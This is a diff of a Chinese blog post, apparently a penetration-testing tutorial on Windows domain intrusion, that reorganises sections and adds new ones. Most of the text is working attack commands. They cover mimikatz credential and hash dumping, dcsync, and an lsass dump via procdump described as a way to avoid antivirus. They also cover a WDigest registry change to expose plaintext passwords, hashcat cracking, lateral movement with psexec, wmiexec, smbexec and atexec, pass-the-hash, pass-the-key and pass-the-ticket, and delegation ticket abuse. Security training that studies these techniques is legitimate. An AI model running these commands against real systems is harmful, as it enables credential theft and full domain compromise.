@@ -3,7 +3,7 @@
     <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>内网渗透（不定时更新） | F1n_blog</title>
-<link rel="shortcut icon" href="https://Jrand-github.github.io/favicon.ico?v=1625227892088">
+<link rel="shortcut icon" href="https://Jrand-github.github.io/favicon.ico?v=1626099669660">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
 <link rel="stylesheet" href="https://Jrand-github.github.io/styles/main.css">
 <link rel="alternate" type="application/atom+xml" title="内网渗透（不定时更新） | F1n_blog - Atom Feed" href="https://Jrand-github.github.io/atom.xml">
@@ -11,17 +11,19 @@
 
 
 
-    <meta name="description" content="本文属于知识普及文章，未经允许，禁止转载（由于内容可能存在错误，不要转载误人子弟）
-#内网安全
+    <meta name="description" content="域渗透
+本文属于知识普及文章，未经允许，禁止转载（由于内容可能存在错误，不要转载误人子弟）
 基本介绍
-基本架构
+基本架构（图解）
 
 Kerberos协议原理（图解）
+
+NTLM认证（图解）
 
 信息收集
 Github项目
 nishang
-https://github.com/sa..." />
+https:/..." />
     <meta name="keywords" content="" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
     <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
@@ -31,7 +33,7 @@ https://github.com/sa..." />
       <div class="main-content">
         <div class="site-header">
   <a href="https://Jrand-github.github.io">
-  <img class="avatar" src="https://Jrand-github.github.io/images/avatar.png?v=1625227892088" alt="">
+  <img class="avatar" src="https://Jrand-github.github.io/images/avatar.png?v=1626099669660" alt="">
   </a>
   <h1 class="site-title">
     F1n_blog
@@ -91,22 +93,24 @@ https://github.com/sa..." />
                 2021-07-02
               </span>
               <span>
-                41 min read
+                42 min read
               </span>
               
             </div>
             
             <div class="post-content-wrapper">
               <div class="post-content">
-                <p>本文属于知识普及文章，未经允许，禁止转载（由于内容可能存在错误，不要转载误人子弟）<br>
-#内网安全</p>
+                <h1 id="域渗透">域渗透</h1>
+<p>本文属于知识普及文章，未经允许，禁止转载（由于内容可能存在错误，不要转载误人子弟）</p>
 <h2 id="基本介绍">基本介绍</h2>
-<h3 id="基本架构">基本架构</h3>
+<h3 id="基本架构图解">基本架构（图解）</h3>
 <figure data-type="image" tabindex="1"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210602084420936.png" alt="image-20210602084420936" loading="lazy"></figure>
 <h3 id="kerberos协议原理图解">Kerberos协议原理（图解）</h3>
 <figure data-type="image" tabindex="2"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-1625227462308.png" alt="域渗透之白银票据黄金票据" loading="lazy"></figure>
+<h3 id="ntlm认证图解">NTLM认证（图解）</h3>
+<figure data-type="image" tabindex="3"><img src="lib/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png" alt="未命名文件" loading="lazy"></figure>
 <h2 id="信息收集">信息收集</h2>
-<h3 id="github项目">Github项目</h3>
+<p>Github项目</p>
 <pre><code>nishang
 https://github.com/samratashok/nishang/releases/tag/v0.7.6
 
@@ -119,24 +123,28 @@ https://github.com/AlessandroZ/LaZagne/releases
 mimikatz
 https://github.com/gentilkiwi/mimikatz/releases
 </code></pre>
-<h3 id="案例1-基本信息">案例1-基本信息</h3>
-<pre><code>旨在了解当前服务器的计算机基本信息，为后续判断服务器角色，网络环境等做准备
+<h3 id="基本信息">基本信息</h3>
+<pre><code>判断是否存在域环境
+ifconfig /all
+net time /domain 
+systeminfo
+
+查看域用户
+whoami
 systeminfo 详细信息*
 net start 启动信息
 tasklist 进程列表
 schtasks 计划任务
 </code></pre>
-<h3 id="案例2-网络信息">案例2-网络信息</h3>
-<pre><code>旨在了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备
-nslookup 域名 追踪来源地址*
+<h3 id="网络信息">网络信息</h3>
+<pre><code>nslookup 域名 追踪来源地址*
 net view /domain 判断存在域*
 net time /domain 判断主域*
 netstat -ano 当前网络端口开放
 ipconfig /all 判断存在域-dns 
 </code></pre>
-<h3 id="案例3-用户信息">案例3-用户信息</h3>
-<pre><code>旨在了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试
-系统默认常见用户身份：
+<h3 id="用户信息">用户信息</h3>
+<pre><code>系统默认常见用户身份：
 Domain Admains：域管理员（默认对域控制器有完全控制权）
 Domain Computers：域内机器
 Domain Controllers：域控制器
@@ -156,20 +164,13 @@ net group &quot;Domain Admins&quot; /domain 查询域管理员账户
 net group &quot;Enterprise Admins&quot; /domain 查询管理员用户组
 net group &quot;Domain Controllers&quot; /domain 查询域控制器
 </code></pre>
-<h3 id="案例4-凭据信息">案例4-凭据信息</h3>
-<pre><code>旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备
-计算机用户HASH，明文获取-mimikatz（win），mimipenguin（linux ）
+<h3 id="凭据信息">凭据信息</h3>
+<pre><code>计算机用户HASH，明文获取-mimikatz（win），mimipenguin（linux ）
 
 mimikatz：
 1.测试域控权限 
 2.导出所有用户口令 
 3.维持域控权限
-
-
-计算机各种协议服务口令获取-Lazagne（all），XenArmor（win）
-Netsh WLAN show profiles
-Netsh WLAN show profile name =&quot;无线名称&quot; key =clear
-
 
 1.站点源码备份文件，数据库备份文件等
 2.各类数据库WEB管理入口，如PHPmyadmin
@@ -178,7 +179,7 @@ Netsh WLAN show profile name =&quot;无线名称&quot; key =clear
 5.windows 保存的WIFI密码
 6.网络内部的各种账号和密码，如：Emain，VPN，FTP，OA等
 </code></pre>
-<h3 id="案例5-域内环境">案例5-域内环境</h3>
+<h3 id="域内环境">域内环境</h3>
 <p>CMD命令(ping)</p>
 <pre><code>for /l %i in (1,1,255) do @ ping 192.168.52.%i -w 1 -n 1|find /i &quot;ttl=&quot;
 </code></pre>
@@ -201,27 +202,13 @@ Get-information
 端口扫描（查看目录对应文件又演示语法，其他同理）
 Invoke-Portscan -startaddress 192.168.3.0 -Endaddress
 192.168.3.100 -ResolveHost -ScanPort
-
 </code></pre>
 <p>工具</p>
 <pre><code>nmap masscan
 </code></pre>
-<h2 id="横向渗透">横向渗透</h2>
-<figure data-type="image" tabindex="3"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210602224425808.png" alt="image-20210602224425808" loading="lazy"></figure>
-<h3 id="github项目-2">GIthub项目</h3>
-<pre><code>impacket工具包
-https://gitee.com/RichChigga/impacket-examples-windows
-
-Pstools官方工具包
-https://docs.microsoft.com/en-us/sysinternals/downloads/pstools
-
-ladon（k8gege开发的内网工具）
-https://github.com/k8gege/Ladon
-
-hashcat
-https://github.com/hashcat/hashcat
-</code></pre>
-<h3 id="注意事项">注意事项</h3>
+<h2 id="凭证获取">凭证获取</h2>
+<h3 id="rdp密码抓取">RDP密码抓取</h3>
+<h3 id="内存密码抓取">内存密码抓取</h3>
 <pre><code>无法获取明文密码解决方案
 Windows2012以上版本默认关闭wdigest,攻击者无法从内存中获取明文密码
 Windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码
@@ -238,7 +225,7 @@ Windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后�
 注册表操作开启Wdigest Auth值
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
 </code></pre>
-<h3 id="案例1-ipc域共享管道">案例1-IPC（域共享管道）</h3>
+<h4 id="mimikatz直接获取">mimikatz直接获取</h4>
 <pre><code>meterpreter导入mimikatz 很多时候会失败 最好自己上传
 upload mimikatz.exe c:\\mimi.exe
 
@@ -248,7 +235,52 @@ privilege::debug
 获取明文密码
 sekurlsa::LogonPasswords
 </code></pre>
-<p>获取到某域主机权限-&gt;  minikatz得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表当做用户名字典-&gt;用到密码明文当做字典-&gt;尝试连接-&gt;创建计划任务（at|schtasks）-&gt;执行文件可为后门或者相关命令</p>
+<h4 id="procdumpmimikatz配合">Procdump+Mimikatz配合</h4>
+<p>Mimikatz属于第三方软件，直接上传到目标主机可能被杀毒软件查杀，这时我们可以配合官方软件Procdump，将Procdump上传目标主机获取用户信息(该文件不可读)，使用本地的Mimikatz打开Procdump获取的用户信息。</p>
+<p>Procdump下载：https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</p>
+<p>procdump 在目标机上执行</p>
+<pre><code>procdump -accepteula -ma lsass.exe lsass.dmp
+</code></pre>
+<p>mimikatz 在本地执行：（对应目标的mimikatz32位或64位）</p>
+<pre><code>sekurlsa::minidump lsass.dmp
+sekurlsa::logonPasswords full
+</code></pre>
+<h3 id="sam文件hash值获取">sam文件hash值获取</h3>
+<pre><code>privilege::debug
+token::elevate
+lsadump::sam
+</code></pre>
+<h3 id="暴力破解ntlm-hash">暴力破解NTLM Hash</h3>
+<p>不现实：基于CMD5，或则国外关于这方面的在线破解</p>
+<p>Windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。</p>
+<pre><code>hashcat -a 0 -m 1000 hash file --force
+</code></pre>
+<p>破解工具：https://github.com/hashcat/hashcat<br>
+更多参考：https://www.freebuf.com/sectool/164507.html</p>
+<h3 id="域用户hash获取dsync">域用户HASH获取（dsync）</h3>
+<pre><code>#获取所有域用户
+lsadump::dcsync /domain:test.com /all /csv
+
+#指定获取某个用户的hash
+lsadump::dcsync /domain:test.com /user:test
+</code></pre>
+<p><a href="https://xie1997.blog.csdn.net/article/details/108988491">(7条消息) 域渗透之Dcsync_谢公子的博客-CSDN博客_dcsync</a></p>
+<h2 id="横向渗透">横向渗透</h2>
+<pre><code>impacket工具包
+https://gitee.com/RichChigga/impacket-examples-windows
+
+Pstools官方工具包
+https://docs.microsoft.com/en-us/sysinternals/downloads/pstools
+
+ladon（k8gege开发的内网工具）
+https://github.com/k8gege/Ladon
+
+hashcat
+https://github.com/hashcat/hashcat
+</code></pre>
+<h3 id="模拟域控">模拟域控</h3>
+<h4 id="ipc域共享管道">IPC（域共享管道）</h4>
+<p>获取到某域主机权限-&gt;   minikatz得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表当做用户名字典-&gt;用到密码明文当做字典-&gt;尝试连接-&gt;创建计划任务（at|schtasks）-&gt;执行文件可为后门或者相关命令</p>
 <pre><code>IPC（ Internet Process Connection）是共享“命名管道”的资管，它是为了让进城间通信而开放的命名管道，可以通过验证用户名和密码获得相关的权限，在远程管路计算机和查看计算机的共享资源时使用。
 利用流程：
  1.建立IPC链接到目标主机
@@ -313,7 +345,69 @@ schtasks /delete /s 192.168.3.21 /tn adduser /f#删除adduser任务
 3. 对方未开启139,445端口，或者被防火墙屏蔽
 4. 输出命令，账号密码有错误
 </code></pre>
-<h3 id="案例2-明文hash传递atexec-impacket">案例2-明文HASH传递atexec-impacket</h3>
+<h4 id="rdp协议传递">RDP协议传递</h4>
+<p>RDP协议连接：判断对方远程桌面服务是否开启（默认：3389），端口扫描判断</p>
+<p>RDP明文密码链接</p>
+<pre><code>windows: mstsc 
+mstsc.exe /console /v:192.168.3.21 /admin
+linux: rdesktop 192.168.3.21:3389
+</code></pre>
+<p>RDP密文链接</p>
+<p>windows Server需要开启 Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win 7 和Windows Server 2008 R2安装了<code>2871997</code>、<code>2973351</code>补丁也支持；开启命令：</p>
+<pre><code>REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
+mstsc.exe /restrictedadmin
+
+mimikatz.exe
+privilege::debug
+sekurlsa::pth /user:administrator /domain:tencent /ntlm:2baaefbdd1ee80755b986ee938848b2 &quot;/run:mstsc.exe /restrictedadmin&quot;
+</code></pre>
+<h4 id="psexec微软工具">Psexec（微软工具）</h4>
+<pre><code>psexec.exe \\192.168.10.131 -u xie\test -p x123456./ cmd
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="lib/20200329223246433.png" alt="img" loading="lazy"></figure>
+<h4 id="wmiexec">wmiexec</h4>
+<p>WMI(Windows Management Instrumentation) 是通过135端口进行利用，支持用户名明文或者hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。（可以执行命令）</p>
+<p>第一种-自带WMIC命令 明文传递 无回显</p>
+<pre><code>wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create &quot;cmd.exe /c  ipconfig &gt;C:\1.txt&quot;
+</code></pre>
+<p>第二种-自带cscript配合wmiexec.vbs脚本 明文传递 有回显(wmiexec.vbs)</p>
+<pre><code>cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345
+</code></pre>
+<p>第三种-第三方套件impacket wmiexec  明文或hash传递 有回显exe版本  容易被杀软查杀(wmiexec.exe)</p>
+<p>https://blog.csdn.net/qq_27446553/article/details/46008473</p>
+<pre><code>wmiexec ./administrator:admin!@#45@192.168.3.32 &quot;whoami&quot;wmiexec god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 &quot;whoami&quot;wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 &quot;whoami&quot;
+</code></pre>
+<p>wmiexec.vbs脚本下载</p>
+<p>https://www.secpulse.com/wp-content/uploads/2015/05/cache-a360611dc24d240989799c29c555e4b7_wmiexec-v1_1.rar</p>
+<h4 id="smbexec">smbexec</h4>
+<p>条件445服务端口开放</p>
+<p>关于psexec进一步https://blog.csdn.net/tomyyyyyy/article/details/115782188</p>
+<pre><code>psexec第一种：先有ipc链接，psexec需要明文或hash传递
+
+net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:administrator
+psexec \\192.168.3.32 -s cmd # 需要先有ipc链接 -s以System权限运行
+
+psexec第二种：不用建立IPC直接提供明文账户密码
+
+psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd 
+psexec -hashes :$HASH$ ./administrator@10.1.2.3
+psexec -hashes :$HASH$ domain/administrator@10.1.2.3
+psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32  // 实际操作中连接不上
+// 以上两种方式使用的官方Pstools内的工具    
+</code></pre>
+<p>smbexec第三种：无需先ipc链接 明文或hash传递  非官方自带-参考impacket工具包使用，操作简单，容易被杀</p>
+<pre><code>smbexec god/administrator:Admin12345@192.168.3.21
+smbexec ./administrator:admin!@#45@192.168.3.32
+smbexec -hashes :$HASH$ ./admin@192.168.3.21
+smbexec -hashes :$HASH$ domain/admin@192.168.3.21
+smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
+smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21
+</code></pre>
+<p>Pstools官方工具包：https://docs.microsoft.com/en-us/sysinternals/downloads/pstools</p>
+<p>impacket工具包下载：https://gitee.com/RichChigga/impacket-examples-windows</p>
+<h4 id="winrm">winrm</h4>
+<p><a href="https://xie1997.blog.csdn.net/article/details/105122945">(7条消息) WinRM远程管理工具的使用_谢公子的博客-CSDN博客_winrm</a></p>
+<h4 id="atexec">atexec</h4>
 <pre><code>atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;
 atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;
 atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;
@@ -362,78 +456,18 @@ for ip in ips:
            print('---&gt;'+exec+'&lt;---')
            os.system(exec)
            time.sleep(1)
+pip install pyinstaller
 </code></pre>
-<pre><code>pip install pyinstaller
-</code></pre>
-<h3 id="案例5-procdumpmimikatz配合凭证获取">案例5-Procdump+Mimikatz配合（凭证获取）</h3>
-<p>Mimikatz属于第三方软件，直接上传到目标主机可能被杀毒软件查杀，这时我们可以配合官方软件Procdump，将Procdump上传目标主机获取用户信息(该文件不可读)，使用本地的Mimikatz打开Procdump获取的用户信息。</p>
-<p>Procdump下载：https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</p>
-<p>procdump 在目标机上执行</p>
-<pre><code>procdump -accepteula -ma lsass.exe lsass.dmp
-</code></pre>
-<p>mimikatz 在本地执行：（对应目标的mimikatz32位或64位）</p>
-<pre><code>sekurlsa::minidump lsass.dmp
-sekurlsa::logonPasswords full
-</code></pre>
-<h3 id="案例6-hashcat暴力破解ntlm-hash">案例6-Hashcat暴力破解NTLM Hash</h3>
-<p>不现实：基于CMD5，或则国外关于这方面的在线破解</p>
-<p>Windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。</p>
-<pre><code>hashcat -a 0 -m 1000 hash file --force
-</code></pre>
-<p>破解工具：https://github.com/hashcat/hashcat<br>
-更多参考：https://www.freebuf.com/sectool/164507.html</p>
-<h3 id="案例7-smb服务明文或hash传递">案例7-SMB服务明文或hash传递</h3>
-<p>条件445服务端口开放</p>
-<p>关于psexec进一步https://blog.csdn.net/tomyyyyyy/article/details/115782188</p>
-<pre><code>psexec第一种：先有ipc链接，psexec需要明文或hash传递
-
-net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:administrator
-psexec \\192.168.3.32 -s cmd # 需要先有ipc链接 -s以System权限运行
-
-psexec第二种：不用建立IPC直接提供明文账户密码
-
-psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd 
-psexec -hashes :$HASH$ ./administrator@10.1.2.3
-psexec -hashes :$HASH$ domain/administrator@10.1.2.3
-psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32  // 实际操作中连接不上
-// 以上两种方式使用的官方Pstools内的工具    
-</code></pre>
-<p>smbexec第三种：无需先ipc链接 明文或hash传递  非官方自带-参考impacket工具包使用，操作简单，容易被杀</p>
-<pre><code>smbexec god/administrator:Admin12345@192.168.3.21
-smbexec ./administrator:admin!@#45@192.168.3.32
-smbexec -hashes :$HASH$ ./admin@192.168.3.21
-smbexec -hashes :$HASH$ domain/admin@192.168.3.21
-smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
-smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21
-</code></pre>
-<p>Pstools官方工具包：https://docs.microsoft.com/en-us/sysinternals/downloads/pstools</p>
-<p>impacket工具包下载：https://gitee.com/RichChigga/impacket-examples-windows</p>
-<h3 id="案例8-wmi服务利用-cscriptwmiexecwmic">案例8-WMI服务利用-cscript,wmiexec,wmic</h3>
-<p>WMI(Windows Management Instrumentation) 是通过135端口进行利用，支持用户名明文或者hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。（可以执行命令）</p>
-<p>第一种-自带WMIC命令 明文传递 无回显</p>
-<pre><code>wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create &quot;cmd.exe /c  ipconfig &gt;C:\1.txt&quot;
-</code></pre>
-<p>第二种-自带cscript配合wmiexec.vbs脚本 明文传递 有回显(wmiexec.vbs)</p>
-<pre><code>cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345
-</code></pre>
-<p>第三种-第三方套件impacket wmiexec  明文或hash传递 有回显exe版本  容易被杀软查杀(wmiexec.exe)</p>
-<p>https://blog.csdn.net/qq_27446553/article/details/46008473</p>
-<pre><code>wmiexec ./administrator:admin!@#45@192.168.3.32 &quot;whoami&quot;
-wmiexec god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;
-wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 &quot;whoami&quot;
-wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 &quot;whoami&quot;
-</code></pre>
-<p>wmiexec.vbs脚本下载</p>
-<p>https://www.secpulse.com/wp-content/uploads/2015/05/cache-a360611dc24d240989799c29c555e4b7_wmiexec-v1_1.rar</p>
-<h3 id="案例9-横向移动pth-ntml传递">案例9-横向移动PTH NTML传递</h3>
+<h4 id="哈希攻击">哈希攻击</h4>
+<h5 id="横向移动pth-ntml传递">横向移动PTH NTML传递</h5>
 <p>PTH(pass the hash) 利用LM或NTLM的值进行的渗透测试</p>
 <p>PTH在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。</p>
-<p>如果禁用了NTLM认证，PsExec无法利用获得的NTLM hash进行远程连接，但是使用mimikatz还是可以攻击成功。对于8.1/2012r2安装补丁kb2871997的Win 7/2008r2/8/2012等，可以使用AES keys代替NT hash来实现PTH攻击</p>
+<p>如果禁用了NTLM认证，PsExec无法利用获得的NTLM  hash进行远程连接，但是使用mimikatz还是可以攻击成功。对于8.1/2012r2安装补丁kb2871997的Win  7/2008r2/8/2012等，可以使用AES keys代替NT hash来实现PTH攻击</p>
 <p>总结：<code>KB2871997</code>补丁后的影响</p>
 <pre><code>PTH：没打补丁用户都可以连接，打了补丁只能administrator连接
 PTK：打了补丁才能用户都可以连接，采用aes256连接
 </code></pre>
-<figure data-type="image" tabindex="4"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/20210307170043249.png" alt="在这里插入图片描述" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/20210307170043249.png" alt="在这里插入图片描述" loading="lazy"></figure>
 <p>未打补丁下的工作组及域连接：</p>
 <pre><code>mimikatz 命令
 privilege::debug           // #提升权限
@@ -446,7 +480,7 @@ sekurlsa::pth /user:boss /domain:tencent /ntlm:ccef208c6485269c20db2cad21734fe7
 上面反弹回来shell 查看域控的d盘信息
 dir \\WIN-83V1721VG9V.tencent.com\d$    // 连接使用ip/域名都可以
 </code></pre>
-<figure data-type="image" tabindex="5"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/20210307181841429.png" alt="在这里插入图片描述" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/20210307181841429.png" alt="在这里插入图片描述" loading="lazy"></figure>
 <p>2）PTK(pass the key) #利用的ekeys aes256进行的渗透测试</p>
 <p>攻击方式同PTH，只是打了补丁后将NTML值换成aes256加密的值</p>
 <p>3）PTT(pass the ticket) #利用的票据凭证TGT进行的渗透测试</p>
@@ -454,7 +488,7 @@ dir \\WIN-83V1721VG9V.tencent.com\d$    // 连接使用ip/域名都可以
 <p>MS14-068基于漏洞，Golden ticket(黄金票据)，SILVER ticket(白银票据)<br>
 其中Golden ticket(黄金票据)，SILVER ticket(白银票据)属于权限维持技术<br>
 MS14-068造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是kb3011780</p>
-<h3 id="案例10-横向移动ptk-ntml传递">案例10-横向移动PTK NTML传递</h3>
+<h5 id="横向移动ptk-ntml传递">横向移动PTK NTML传递</h5>
 <p>打<code>KB2871997</code>补丁后的工作组及域连接:</p>
 <pre><code>mimikatz 命令
 privilege::debug           // 提升权限
@@ -462,39 +496,9 @@ sekurlsa::ekeys            // 获取aes
 
 sekurlsa::pth /user:administrator /domain:tencent /aes256:f305f03562f81f7847f17bcf9477cce414fb47e4271763cf9078cc2566316e0f
 </code></pre>
-<figure data-type="image" tabindex="6"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/20210307184007412.png" alt="在这里插入图片描述" loading="lazy"></figure>
-<h3 id="案例11-横向移动ptt哈希票据传递-ms14068kekeo本地">案例11-横向移动PTT哈希票据传递-ms14068&amp;kekeo&amp;本地</h3>
-<h4 id="ms14-068">MS14-068</h4>
-<p>powershell执行</p>
-<p>能实现普通用户直接获取域控system权限</p>
-<pre><code>1.查看当前sid 
-whoami/user
-2.清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造
-mimikatz # kerberos::purge         // 清空当前机器中所有凭证
-mimikatz # kerberos::list          // 查看当前机器凭证
-mimikatz # kerberos::ptc 票据文件   // 将票据注入到内存中
-3.利用ms14-068生成TGT数据 
-ms14-068.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码
-MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#45
-4.票据注入内存
-mimikatz.exe &quot;kerberos::ptc TGT_mary@god.org.ccache&quot; exit
-5.查看凭证列表 
-klist
-6.利用  
-dir \\192.168.3.21\c$
-</code></pre>
-<p>MS14-068下载：https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</p>
-<h4 id="利用工具kekeo">利用工具kekeo</h4>
-<p>工具kekeo下载：https://github.com/gentilkiwi/kekeo/releases</p>
-<pre><code>1.生成票据
-kekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot;
-2.导入票据
-kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi
-3.查看凭证 klist
-4.利用net use载入
-dir \\192.168.3.21\c$
-</code></pre>
-<h3 id="伪造本地票据ptt">伪造本地票据（PTT）</h3>
+<figure data-type="image" tabindex="7"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/20210307184007412.png" alt="在这里插入图片描述" loading="lazy"></figure>
+<h5 id="横向移动ptt哈希票据传递">横向移动PTT哈希票据传递</h5>
+<p>伪造本地票据（PTT）</p>
 <p>这种方式是猜测当前电脑连接过域控，并且连接时长没有超过票据的过期时间（10小时）</p>
 <p>mimikatz 命令</p>
 <pre><code>privilege::debug           // 提升权限
@@ -502,24 +506,42 @@ sekurlsa::tickets /export   // 导出本地所有票据
 kerberos::ptt xxxxxxxxxx.xxxx.kirbi  // 导入票据 
 dir \\192.168.3.21\c$   // 利用
 </code></pre>
-<h3 id="案例12-rdp协议传递">案例12-RDP协议传递</h3>
-<p>RDP协议连接：判断对方远程桌面服务是否开启（默认：3389），端口扫描判断</p>
-<p>RDP明文密码链接</p>
-<pre><code>windows: mstsc 
-mstsc.exe /console /v:192.168.3.21 /admin
-linux: rdesktop 192.168.3.21:3389
+<h3 id="域渗透独特的攻击">域渗透独特的攻击</h3>
+<h4 id="委派攻击重点">委派攻击(重点)</h4>
+<p><a href="https://www.redteaming.top/2020/02/11/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Kerberos%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE">域渗透——Kerberos委派攻击 | 七友 (redteaming.top)</a></p>
+<h5 id="非约束委派攻击">非约束委派攻击</h5>
+<figure data-type="image" tabindex="8"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210712221911770.png" alt="image-20210712221911770" loading="lazy"></figure>
+<p>设置域内主机为非约束委派</p>
+<figure data-type="image" tabindex="9"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210712221141559.png" alt="image-20210712221141559" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210712221511347.png" alt="image-20210712221511347" loading="lazy"></figure>
+<p>当服务账号或者主机被设置为非约束性委派时，其<code>userAccountControl</code>属性会包含<code>TRUSTED_FOR_DELEGATION</code></p>
+<p>为主机注册一个服务</p>
+<pre><code>setspn -A https/apache2.4 STARS
 </code></pre>
-<p>RDP密文密码链接</p>
-<p>windows Server需要开启 Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win 7 和Windows Server 2008 R2安装了<code>2871997</code>、<code>2973351</code>补丁也支持；开启命令：</p>
-<pre><code>REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
-mstsc.exe /restrictedadmin
-
-mimikatz.exe
-privilege::debug
-sekurlsa::pth /user:administrator /domain:tencent /ntlm:2baaefbdd1ee80755b986ee938848b2 &quot;/run:mstsc.exe /restrictedadmin&quot;
+<p>域管理员登录 STARS</p>
+<figure data-type="image" tabindex="11"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210712221305451.png" alt="image-20210712221305451" loading="lazy"></figure>
+<p>导出当前票据</p>
+<pre><code>privilege::debug 
+sekurlsa::tickets /export
 </code></pre>
-<h3 id="案例13-kerberoast攻击spn扫描">案例13-Kerberoast攻击(SPN扫描)</h3>
-<p>spn扫描也可以叫扫描Kerberos服务实例名称，在Active Directory环境中发现服务的最佳方法是通过“SPN扫描”。通过请求特定SPN类型的服务主体名称来查找服务，SPN扫描攻击者通过网络端口扫描的主要好处是SPN扫描不需要连接到网络上的每个IP来检查服务端口。SPN扫描通过LDAP查询向域控制器执行服务发现。由于SPN查询是普通Kerberos票据的一部分，因此如果不能被查询，但可以用网络端口扫描来确认。</p>
+<figure data-type="image" tabindex="12"><img src="https://junrand-1255919048.cos.ap-guangzhou.myqcloud.com/Typora/image-20210712221344097.png" alt="image-20210712221344097" loading="lazy"></figure>
+<p>导入票据</p>
+<pre><code>kerberos::ptt [0;140cb4]-2-0-60a10000-Administrator@krbtgt-JUN.SS.kirbi
+kerberos::list
+</code></pre>
+<p>即可访问域控制器</p>
+<p>查找域中配置非约束委派的用户：</p>
